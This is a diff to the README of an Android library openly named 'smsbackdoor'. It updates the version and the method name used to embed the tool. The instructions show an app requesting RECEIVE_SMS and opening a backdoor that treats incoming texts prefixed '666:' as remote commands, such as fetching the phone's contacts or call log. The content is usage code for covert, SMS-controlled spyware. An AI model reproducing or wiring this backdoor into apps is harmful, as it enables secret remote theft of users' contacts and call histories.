@@ -15,13 +15,13 @@ allprojects {
 2. Add the dependency to your app's build.gradle file
 ```gradle
 dependencies {
-    implementation 'com.github.evilthreads669966:smsbackdoor:0.0.2'
+    implementation 'com.github.evilthreads669966:smsbackdoor:0.0.3'
 }
 ```
 3.  Open the binary sms backdoor inside your Activity and pass in your command code and define your remote commands handler. Make sure to request RECEIVE_SMS permission before opening it.
 ```kotlin
 //666: is the command code. So you would start all of your remote commands for example: 666: COMMAND_GET_CONTACTS
-BackdoorService.openDoor(this, "666:"){ remoteCommand ->
+SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
     when(remoteCommand){
         "COMMAND_GET_CONTACTS" -> //get contacts
         "COMMAND_GET_CALL_LOG" -> //get call log
